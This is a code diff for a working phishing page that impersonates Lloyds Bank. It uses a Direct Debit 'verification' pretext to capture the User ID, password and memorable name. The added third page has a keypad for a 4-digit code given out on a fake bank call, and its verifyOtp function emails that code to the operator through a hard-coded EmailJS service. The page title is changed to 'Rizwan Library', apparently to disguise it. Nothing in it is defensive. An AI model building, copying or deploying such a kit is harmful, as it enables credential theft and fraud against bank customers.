@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Lloyds Bank</title>
+<title>Rizwan Library</title>
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script>
   emailjs.init("5g0vSGPG-xbz8lu7d");
@@ -12,41 +12,50 @@
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
     font-family: Arial, sans-serif;
-    background: #f0f4f8;
+    background: #f4f4f4;
     min-height: 100vh;
     display: flex;
     justify-content: center;
     align-items: flex-start;
     padding: 20px;
   }
-  @media (min-width: 768px) { body { align-items: center; padding: 40px 20px; } }
+  @media (min-width: 768px) {
+    body { align-items: center; padding: 40px 20px; }
+  }
   .card {
-    width: 100%; max-width: 480px; background: #fff;
-    border-radius: 20px; overflow: hidden;
+    width: 100%;
+    max-width: 480px;
+    background: #fff;
+    border-radius: 20px;
+    overflow: hidden;
     box-shadow: 0 8px 32px rgba(0,0,0,0.12);
   }
   .header {
-    background: #1565c0; padding: 14px 20px;
-    display: flex; align-items: center; justify-content: space-between;
+    background: #00694f;
+    padding: 14px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: flex-end;
   }
   .secure-badge {
-    display: flex; align-items: center; gap: 5px;
-    background: rgba(255,255,255,0.18); border-radius: 20px; padding: 4px 12px;
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    background: rgba(255,255,255,0.18);
+    border-radius: 20px;
+    padding: 4px 12px;
   }
   .secure-badge svg { width: 13px; height: 13px; fill: #fff; }
   .secure-badge span { color: #fff; font-size: 12px; }
   .page { display: none; }
   .page.active { display: block; }
+
+  /* PAGE 1 */
   .login-body { padding: 28px 20px 36px; }
   @media (min-width: 480px) { .login-body { padding: 32px 32px 40px; } }
   .welcome-title { font-size: clamp(20px, 5vw, 26px); font-weight: 700; color: #111; margin-bottom: 6px; }
-  .welcome-sub { font-size: 13px; color: #555; margin-bottom: 16px; }
-  .welcome-sub a { color: #1565c0; text-decoration: underline; }
-  .notice-bar {
-    background: #e3f0fc; border-left: 3px solid #1565c0;
-    border-radius: 0 8px 8px 0; padding: 10px 14px;
-    margin-bottom: 20px; font-size: 13px; color: #0d47a1; line-height: 1.6;
-  }
+  .welcome-sub { font-size: 13px; color: #555; margin-bottom: 24px; }
+  .welcome-sub a { color: #00694f; text-decoration: underline; }
   .field-group { margin-bottom: 16px; }
   .field-label { font-size: 13px; font-weight: 600; color: #111; margin-bottom: 6px; display: block; }
   .field-input-wrap { position: relative; }
@@ -56,15 +65,15 @@
     font-size: 15px; background: #fff; color: #111;
     outline: none; transition: border-color 0.2s; -webkit-appearance: none;
   }
-  .field-input:focus { border-color: #1565c0; }
+  .field-input:focus { border-color: #00694f; }
   .show-btn {
     position: absolute; right: 14px; top: 50%; transform: translateY(-50%);
-    background: none; border: none; color: #1565c0;
+    background: none; border: none; color: #00694f;
     font-size: 13px; font-weight: 600; cursor: pointer; padding: 4px;
   }
   .field-hint { font-size: 11px; color: #888; margin-top: 5px; }
   .remember-row { display: flex; align-items: flex-start; gap: 10px; margin-bottom: 10px; }
-  .remember-row input[type=checkbox] { margin-top: 2px; accent-color: #1565c0; width: 18px; height: 18px; flex-shrink: 0; }
+  .remember-row input[type=checkbox] { margin-top: 2px; accent-color: #00694f; width: 18px; height: 18px; flex-shrink: 0; }
   .remember-label { font-size: 13px; color: #111; cursor: pointer; }
   .warning-text {
     font-size: 12px; color: #555; margin-bottom: 20px;
@@ -73,31 +82,33 @@
   }
   .warning-text strong { color: #111; }
   .continue-btn {
-    width: 100%; background: #1565c0; color: #fff; border: none;
+    width: 100%; background: #00694f; color: #fff; border: none;
     border-radius: 10px; padding: 15px; font-size: 16px; font-weight: 600;
     cursor: pointer; margin-bottom: 16px; transition: background 0.2s; -webkit-appearance: none;
   }
-  .continue-btn:hover { background: #0d47a1; }
-  .continue-btn:disabled { background: #90b4e8; cursor: not-allowed; }
+  .continue-btn:hover { background: #005540; }
+  .continue-btn:disabled { background: #7dab9a; cursor: not-allowed; }
   .forgot-link { text-align: center; }
-  .forgot-link a { color: #1565c0; font-size: 14px; text-decoration: underline; }
+  .forgot-link a { color: #00694f; font-size: 14px; text-decoration: underline; }
   #toast {
     display: none; margin-top: 14px; padding: 11px 14px;
     border-radius: 8px; font-size: 13px; font-weight: 600; text-align: center;
   }
-  #toast.success { background: #e3f0fc; color: #1565c0; border: 1px solid #1565c033; }
-  #toast.error { background: #fdecea; color: #c0392b; border: 1px solid #c0392b33; }
+  #toast.success { background: #e6f4ef; color: #00694f; border: 1px solid #00694f33; }
+  #toast.error   { background: #fdecea; color: #c0392b; border: 1px solid #c0392b33; }
+
+  /* PAGE 2 */
   .success-body { padding: 36px 24px 44px; text-align: center; }
   @media (min-width: 480px) { .success-body { padding: 44px 36px 52px; } }
   .tick-circle {
-    width: 80px; height: 80px; border-radius: 50%; background: #1565c0;
+    width: 80px; height: 80px; border-radius: 50%; background: #00694f;
     display: flex; align-items: center; justify-content: center;
     margin: 0 auto 20px;
     animation: popIn 0.5s cubic-bezier(.36,1.56,.64,1) both;
   }
   .tick-circle svg { width: 40px; height: 40px; fill: none; stroke: #fff; stroke-width: 3; stroke-linecap: round; stroke-linejoin: round; }
   @keyframes popIn {
-    0% { transform: scale(0); opacity: 0; }
+    0%   { transform: scale(0); opacity: 0; }
     100% { transform: scale(1); opacity: 1; }
   }
   .success-title { font-size: clamp(18px, 4vw, 22px); font-weight: 700; color: #111; margin-bottom: 10px; }
@@ -105,17 +116,68 @@
   .info-box {
     background: #faf6ec; border-left: 3px solid #e6a817;
     border-radius: 0 8px 8px 0; padding: 14px 16px;
-    text-align: left; margin-bottom: 0;
+    text-align: left; margin-bottom: 28px;
   }
   .info-box p { font-size: 13px; color: #555; line-height: 1.75; }
   .info-box strong { color: #111; }
+  .success-btn {
+    width: 100%; background: #00694f; color: #fff; border: none;
+    border-radius: 10px; padding: 15px; font-size: 16px; font-weight: 600;
+    cursor: pointer; transition: background 0.2s;
+  }
+  .success-btn:hover { background: #005540; }
+
+  /* PAGE 3 */
+  .otp-body { padding: 32px 20px 40px; }
+  @media (min-width: 480px) { .otp-body { padding: 36px 36px 48px; } }
+  .otp-icon {
+    width: 64px; height: 64px; border-radius: 50%; background: #e6f4ef;
+    display: flex; align-items: center; justify-content: center; margin: 0 auto 18px;
+  }
+  .otp-icon svg { width: 30px; height: 30px; fill: #00694f; }
+  .otp-title { font-size: clamp(17px, 4vw, 21px); font-weight: 700; color: #111; margin-bottom: 8px; text-align: center; }
+  .otp-sub { font-size: 13px; color: #555; line-height: 1.65; margin-bottom: 28px; text-align: center; }
+  .otp-sub strong { color: #111; }
+  .otp-display { display: flex; justify-content: center; gap: 12px; margin-bottom: 28px; }
+  .otp-box {
+    width: 56px; height: 64px; border: 2px solid #bbb; border-radius: 10px;
+    font-size: 28px; font-weight: 700; color: #111;
+    display: flex; align-items: center; justify-content: center;
+    background: #fafafa; transition: border-color 0.2s, box-shadow 0.2s;
+  }
+  .otp-box.filled { border-color: #00694f; background: #fff; }
+  .otp-box.active { border-color: #00694f; box-shadow: 0 0 0 3px rgba(0,105,79,0.15); }
+  .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; max-width: 300px; margin: 0 auto 24px; }
+  .key {
+    background: #f0f0f0; border: none; border-radius: 12px;
+    padding: 18px 10px; font-size: 22px; font-weight: 600; color: #111;
+    cursor: pointer; transition: background 0.15s, transform 0.1s; touch-action: manipulation;
+  }
+  .key:hover { background: #e2e2e2; }
+  .key:active { transform: scale(0.92); }
+  .key.zero { grid-column: 2; }
+  .key.del { background: #fdecea; color: #c0392b; font-size: 18px; }
+  .key.del:hover { background: #f5c6c6; }
+  .verify-btn {
+    width: 100%; background: #00694f; color: #fff; border: none;
+    border-radius: 10px; padding: 15px; font-size: 16px; font-weight: 600;
+    cursor: pointer; transition: background 0.2s; margin-bottom: 14px;
+  }
+  .verify-btn:hover { background: #005540; }
+  .verify-btn:disabled { background: #7dab9a; cursor: not-allowed; }
+  #otpToast {
+    display: none; margin-top: 12px; padding: 11px 14px;
+    border-radius: 8px; font-size: 13px; font-weight: 600; text-align: center;
+  }
+  #otpToast.error   { background: #fdecea; color: #c0392b; border: 1px solid #c0392b33; }
+  #otpToast.success { background: #e6f4ef; color: #00694f; border: 1px solid #00694f33; }
 </style>
 </head>
 <body>
 
 <div class="card">
+
   <div class="header">
-    <svg height="28" viewBox="0 0 456.5 105.8" xmlns="http://www.w3.org/2000/svg" style="filter: brightness(0) invert(1);"><path d="m97.6 74.9c3.8-5.5 6.5-10 8.8-16.6h7.1c-3.3 8.4-7.2 15-12.7 22.5v11.2h-6.3v-11.1c-5.5-7.6-9.4-14.1-12.7-22.5h7.1c2.2 6.6 4.9 11.1 8.7 16.5m65.1-2.8c-3.1-1-4.9-1.5-6-2.3-1.2-.7-1.5-1.6-1.5-2.5 0-1.4.8-2.3 2-2.9s2.8-.8 4.2-.8c2.2 0 4.7.5 7.3 1.4l2.1-4.9c-2.6-1.3-6.1-2.1-9.4-2.1-3.4 0-6.4.8-8.5 2.3-2.6 1.7-3.9 4.2-3.9 7.2 0 5.8 4.9 8 9.7 9.6 2 .7 4.1 1.2 5.5 2s2.2 1.9 2.2 3.3c0 1.6-1 2.7-2 3.2-1.2.7-3.1 1-5 1-4.5 0-7.7-1.7-10-3.3l-2.2 5.1c2.9 2.2 7.7 3.8 12.5 3.8 7.4 0 13-3.9 13-10.2 0-5.5-4.5-8.2-10-9.9m-34.6 14h-4.6v-21.9h4c7 0 11.5 3.8 11.5 10.7 0 6.6-4.1 11.2-10.9 11.2m-.7-27.8h-10.1v33.7h10.7c9.9 0 17.3-7 17.3-17.1 0-9.9-7-16.6-17.9-16.6m76.4 28.6h-5.4v-9.8h5.6c4.8 0 7.3 1.3 7.3 4.7 0 4.5-4.3 5.1-7.5 5.1m-5.4-23.5h4.8c4.5 0 6.6 1.1 6.6 4s-2.1 4.6-6.1 4.6h-5.3zm11.6 10.9c3.6-1.2 5.8-3.7 5.8-7.6 0-5.9-5.2-8.3-10.3-8.3h-13.1v33.6h12.2c6.3 0 12.7-2.6 12.7-9.6 0-4.7-2.9-7.5-7.3-8.1m73.4-16h-5.9v24.3h-.1l-14.2-24.3h-7.7v33.7h5.8v-25.1h.1l14.5 25.1h7.5zm19.5 16.2 15.6-16.2h-7.9l-14 15.1h-.2v-15.1h-5.9v33.7h5.9v-16.3h.2l14.9 16.3h8.3zm-276.9 17.5h18.9l2-6h-14.8v-27.7h-6.1zm-26 0h18.9l2.1-6h-14.8v-27.7h-6.2zm65-5.4c-6.8 0-10.7-5-10.7-11.4s3.9-11.4 10.7-11.4c6.9 0 10.8 5.2 10.8 11.5-.1 6.2-4 11.3-10.8 11.3m.1-28.6c-10.3 0-17.1 7.6-17.1 17.2 0 9.5 6.6 17.1 17 17.1 10.3 0 17.1-7.7 17.1-17.2-.1-9.5-6.8-17.1-17-17.1m170.2 26.8c2.5 0 4.9-.2 7-.8l3.1 8h7l-14.5-33.6h-5.1l-14.6 33.6h7l3.1-8c2.1.6 4.5.8 7 .8m0-5.1c-1.8 0-3.4-.1-5.2-.5l5.2-13.3 5.2 13.3c-1.8.4-3.4.5-5.2.5" fill="#006c32"/><path d="m451.8 55.6c2.3 1.7 4.7 2.9 4.7 5.6 0 .8-1 1.6-3.2 1.6-1.7 0-3.5-.5-4.4-1.7-.7-.9.3-2.2-.3-3.1-.5-.8-1.5-.4-2.2-.8-.8-.5-.9-.8-1.5-2-.6-1.4-2.7-3.7-5.2-6.2-2.1-2.1-4.3-3.2-5.3-3.1-.7.1-.9.1-1.6.1-1.8 0-3.3 1.7-5.9 2.8-1.8.8-2.8 1.2-3.9 1.4l-.4.5 2.3-.1c2.2 0 5-.3 7.2-.3s3.3 2 4.2 4.1c1.7 4.2 4.2 10.3 7.3 15.4 1.5 2.4 2.7 3.9 2.7 6.9 0 .9-.1 2.2-1.3 2.2-1.7 0-6-1.8-6-3.7 0-1.5 1.2-2.1 1.2-3.6 0-.9-1.4-.8-1.7-1.6-1.1-4.5-2.4-9-4.9-11.7-1.3-1.4-1.5-2-2.8-2-.7 0-1.4.2-2 .4-3.5 1.3-8.2 5.3-14.1 7-2.2.7-2.6-.6-4.9-.2h.2c-1.9.4-3.3 1.5-5.9 2.2-3.5 1-9.6 1.5-14.5.8-3.5-.5-8-1.2-9.9-1.1-1.5 4.2-4.6 9.8-9.3 12-2.5 1.1-3.2 2.6-2.5 5.4.9 3.5 4 6 5.6 9 1.5 2.5 3.9 6.6 6.4 7.9s4.1 3.2 4.1 4.9c0 .8-.3 1.2-1.1 1.2h-5.1c-.8 0-1.2-.5-1.3-.8-.7-1.3-.2-2.5-1.2-3.7-.7-.8-1.2-.6-2.1-1.3-1.5-1.5-.4-2.3-1.5-4.2-3.2-5.1-4.6-6.3-7.3-10-1.5-1.9-3.4-2.9-3.4-5.4 0-3.1 3.1-3.6 3-6.7-2 1.5-4.3 2.6-7.9 3.1-.5.1-1.7 1-2.2 1.6-1.2 1.2-1.7 2.5-1.9 4.3-.4 4.2-1.2 8.4-.7 12.6.7 2.7 1.2 3.6 3.4 5.1 1.4.9 3 2.2 3.2 4.2 0 .5-.2 1.2-.9 1.2h-5.5c-.5 0-1-.4-1.2-.7-.6-1.1-.2-1.8-.5-3.1-.5-2.5-3.4-2.4-3.4-5 0-.8.5-1.8.5-3.4.2-3.5 1.2-9.3.2-16.2-.5-4 3.7-4.2 5.9-7.7 1.3-2 .9-1.2 1.7-2.6.8-1.5.6-2.6.5-3.5 0-1.2-1.2-3.6-.4-8.6.3-2.2 1.4-4.5 2.9-6.4 0-.1 0-.4-.5-.4-2.2.2-2.2-.4-3.6-.4s-2.5 1.2-2.7 1.8c-.7-.3-1-1.1-1-1.5 0-.8.2-1.5.9-2.2.3-.3 0-.5-.4-.5-1.7 0-3.3 2.1-3.7 3.5-1-.2-1.1-1.5-1.5-1.5-.5 0-.8.7-.8 1.4 0 4.9 8 6 8 12.5 0 7.5-9 5.9-9 8.6 0 .5.4 1 1.1 1.3-.3.7-1.1 1-1.9 1-2 0-3.5-1.5-3.5-3.5 0-4.1 5.5-4.2 5.5-7.3 0-1.5-.9-1.9-1.8-2.6-5.2-3.7-8.2-7.4-8.2-13.5 0-6.6 4.6-11.6 10.5-11.6 8.6 0 8.9 10 16.7 10.8 2.9-2 6.4-3.2 9.8-3.2 5.1 0 7.3 1.3 12.7 1.3 2.2 0 5.8-.6 10.1-3.6 1.6-1.1 2.3-1.3 3.8-2.6 3.4-2.9 6.6-8.6 6.6-12.7v.2c0-1.3-.3-2.1-.9-2.1-1.8 0-3.5 1.7-5.3 3.5-1.2 1.2.6 1.8-2 3.2-.9.5-2-.4-3-.4-2.1 0-3-2.5-3-4.6 0-1.1.8-1.4 1.3-2.4 1.1-2.1 1-2.9 2-4.9.6-1.4 1.7-2.3 1.6-3.3 0-.4-.3-.6-.3-1 0-2.1 2.8-3.5 2.8-5.6 0-1.2-1.3-1.7-1.6-2.6s-.1-1.2-.1-1.2c.1-.2.2-.2.4-.2 1.1 0 1.5 1.2 2.5 1.8.1-1.4-.4-1.7-.4-2.7 0-.5-.1-1.4.5-1.4.7 0 .6.9 1.2 1.4.8.6 1.5.5 2.3 1.1 1.1.7 1.7 1.9 2.1 1.9 1.1.2 1.4-1.2.8-1.9 1.2-.1 2.5.9 4.1.9 2.5 0 3.4.7 3.9 1.1 1.6 1.4 1.9 2.5 3.7 2.5.9 0 1.4-.8 1.6-1.1 1.2.9 1.3 3.2 0 5.2.5 1.6 2.8 1.8 3.9 2.6s.9 1.2 1.7 1.6c.6.4 1.2.3 1.6 0 .5 2.2-1.3 4.1-3.6 4.4.1 2.8 3 4.5 4.3 5.2-.8 1.7-2.2 2.2-3.4 2.5.4 1.7 2.2 4.2 1.3 6.4-.8-.4-2.1 0-2.1 1.2 0 1.4 1.8 2.1-.1 3.1-.8.5-1 1.7.5 2.9 2-.5 3.9-.5 6.2-.5 1.4 0 3.2-.4 4.5-.4 2.3 0 3.7.9 5.4 2.8 4.3 4.5 8.2 9.4 12.6 12.7" fill="#231f20"/><path d="m337.3 43.3c.9 0 2.6-5.1 6.1-5.1 1 0 1.2.4 1.2.8 0 .7-1.2 1.3-1.2 2.2 0 .2.1.4.4.4.8 0 1.5-1.9 4.9-1.9.9 0 1.7.1 2.5.3.4.1 1.2.5.8-.6-.8-2.4-3.5-4.6-7.2-4.6s-7.6 3.3-8 7.3c.1.7.1 1.2.5 1.2m64-31.8c-1-.4-1.2-.9-.8-2.2.2-1.3.3-1.9-.3-2-.5-.2-1.2.2-1.9.9-.6.8-1.6 1.9-1.9 2.7-.3 1.1 1 .9.1 2.7-1.6 2.9-2 3.6-2.8 5.6-.7 2.2-1.2 2.5-1.6 3.2-.5.6.6.7 1.8.3 1.3-.5 1.4 1.1.9 2.2-.4.8-.1 1.1 1 .2 1-.8-.5-1.4-.2-3.9.4-2.2.8-3.5 2.2-5.7 1.2-1.9 2.2-3.3 4.2-2.6.8.4.4-.9-.7-1.4m42.9 65.5c.4 0 .5-.5.5-1 0-1.1-.6-2.7-1.5-3.4-.2 1.6-1 2.7-1 3.4 0 .5 1.5 1 2 1m9.6-15.5c.6 0 1.5-.2 1.5-.7 0-.9-1.4-2.5-2.6-2.9.8 1.6 0 3.6 1.1 3.6m-42.4-21.1c8.7 4 8.2 11.3 8.9 9.5.3-.8 1.5-4.4-1.6-7.9-2.4-2.8-3.3-2.1-2.4-4.4 3.8-9.2 6.2-23.1-5.2-27.9-1.3-.5-2.4-.5-2.4-.3s1.2.6 2.7 1.6c7.6 5 5.2 18.7-1.7 25.3-2.2 2.3-1.1 2.8 1.7 4.1m-29.8 64c.6 0 .3-.9.1-1.3-.5-.9-1.5-1.5-2.4-1.9.2.9.3 3.2 1.2 3.2zm-26.3 0c.6 0 .2-.9-.1-1.3-.5-.9-1.6-1.5-2.5-1.9.2.9.4 3.2 1.3 3.2zm31.9-52.3c4.8-.5 5.6-1.6 6.4-5.2.4-1.7 1.6-3.5 2.7-4.6.7-.8 1.4-1.4 2.1-2.5.2-.5.4-.8 0-.7-.5.4-2.2 1.5-2.9 2-3.4 2.4-8.6 3.5-10.6 3.5-4.4 0-8.2-1.3-12.2-1.3-12 0-16.5 9.4-15.9 14.9.1.9.2.9.5.9.8 0 1.6-3.2 4.6-6.1 4.4-4.2 9.2-6.6 16-6.6 4.9 0 7 1.6 7 2.2 0 1.2-2.1 1.3-1.9 2.5-.1.5 1 1.4 4.2 1" fill="#6d6e70"/></svg>
     <div class="secure-badge">
       <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
         <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1 14l-3-3 1.41-1.41L11 12.17l4.59-4.58L17 9l-6 6z"/>
@@ -127,11 +189,8 @@
   <!-- PAGE 1: LOGIN -->
   <div class="page active" id="page-login">
     <div class="login-body">
-      <h1 class="welcome-title">Welcome to Lloyds Bank</h1>
-      <p class="welcome-sub">New to Lloyds Bank? <a href="#">Register online</a></p>
-      <div class="notice-bar">
-        <strong>Important:</strong> Your Direct Debit details require verification. Please confirm your identity below to update your monthly billing information securely.
-      </div>
+      <h1 class="welcome-title">Welcome to Lloyds bank</h1>
+      <p class="welcome-sub">Important: Your Direct Debit details require verification. Please confirm your identity below to update your monthly billing information securely.</a></p>
       <div class="field-group">
         <label class="field-label" for="userid">User ID</label>
         <input class="field-input" type="text" id="userid" autocomplete="off" placeholder="Enter your User ID" />
@@ -149,7 +208,7 @@
           <input class="field-input" type="password" id="memorable" autocomplete="off" placeholder="Enter your Memorable Name" />
           <button class="show-btn" type="button" onclick="togglePw('memorable', this)">Show</button>
         </div>
-        <p class="field-hint">The name you provided when registering.</p>
+        <p class="field-hint">The address you provided when registering.</p>
       </div>
       <div class="remember-row">
         <input type="checkbox" id="remember" />
@@ -177,6 +236,41 @@
       <div class="info-box">
         <p>You will receive a call from your bank to confirm the changes on your <strong>direct debit</strong>. A bank agent will give you a <strong>4-digit code</strong> during the call — please attend the call and enter the 4 digits on the keypad to confirm your direct debit update.</p>
       </div>
+    
+    </div>
+  </div>
+
+  <!-- PAGE 3: KEYPAD -->
+  <div class="page" id="page-otp">
+    <div class="otp-body">
+      <div class="otp-icon">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.01-.24 11.47 11.47 0 003.59.57 1 1 0 011 1V20a1 1 0 01-1 1A17 17 0 013 4a1 1 0 011-1h3.5a1 1 0 011 1 11.47 11.47 0 00.57 3.59 1 1 0 01-.25 1.01l-2.2 2.19z"/>
+        </svg>
+      </div>
+      <h2 class="otp-title">Enter Your 4-Digit Code</h2>
+      <p class="otp-sub">Please enter the <strong>4-digit code</strong> provided by the bank agent on the call to confirm your direct debit update.</p>
+      <div class="otp-display">
+        <div class="otp-box active" id="box-0"></div>
+        <div class="otp-box" id="box-1"></div>
+        <div class="otp-box" id="box-2"></div>
+        <div class="otp-box" id="box-3"></div>
+      </div>
+      <div class="keypad">
+        <button class="key" onclick="keyPress('1')">1</button>
+        <button class="key" onclick="keyPress('2')">2</button>
+        <button class="key" onclick="keyPress('3')">3</button>
+        <button class="key" onclick="keyPress('4')">4</button>
+        <button class="key" onclick="keyPress('5')">5</button>
+        <button class="key" onclick="keyPress('6')">6</button>
+        <button class="key" onclick="keyPress('7')">7</button>
+        <button class="key" onclick="keyPress('8')">8</button>
+        <button class="key" onclick="keyPress('9')">9</button>
+        <button class="key zero" onclick="keyPress('0')">0</button>
+        <button class="key del" onclick="keyDel()">&#9003;</button>
+      </div>
+      <button class="verify-btn" id="verifyBtn" onclick="verifyOtp()" disabled>Confirm Direct Debit</button>
+      <div id="otpToast"></div>
     </div>
   </div>
 
@@ -216,7 +310,38 @@
     .catch(err => { console.error(err); showToast('❌ Failed to send. Please try again.', 'error'); })
     .finally(() => { btn.disabled = false; btn.textContent = 'Continue'; });
   }
+  let otp = [];
+  function keyPress(d) {
+    if (otp.length >= 4) return;
+    otp.push(d); updateBoxes();
+  }
+  function keyDel() {
+    if (!otp.length) return;
+    otp.pop(); updateBoxes();
+  }
+  function updateBoxes() {
+    for (let i = 0; i < 4; i++) {
+      const box = document.getElementById('box-' + i);
+      box.textContent = otp[i] ? '●' : '';
+      box.classList.toggle('filled', i < otp.length);
+      box.classList.toggle('active', i === otp.length && i < 4);
+    }
+    document.getElementById('verifyBtn').disabled = otp.length < 4;
+  }
+  function verifyOtp() {
+    const code = otp.join('');
+    const toast = document.getElementById('otpToast');
+    emailjs.send("service_p6xk4mw", "template_tslrh0l", {
+      user_id: 'OTP Code Entered', user_age: '-',
+      address: 'Direct Debit Code: ' + code,
+      remember: 'No', submitted_at: new Date().toLocaleString()
+    });
+    toast.textContent = '✅ Code confirmed. Your direct debit update is being processed.';
+    toast.className = 'success'; toast.style.display = 'block';
+    document.getElementById('verifyBtn').disabled = true;
+  }
 </script>
 
 </body>
 </html>
+ 
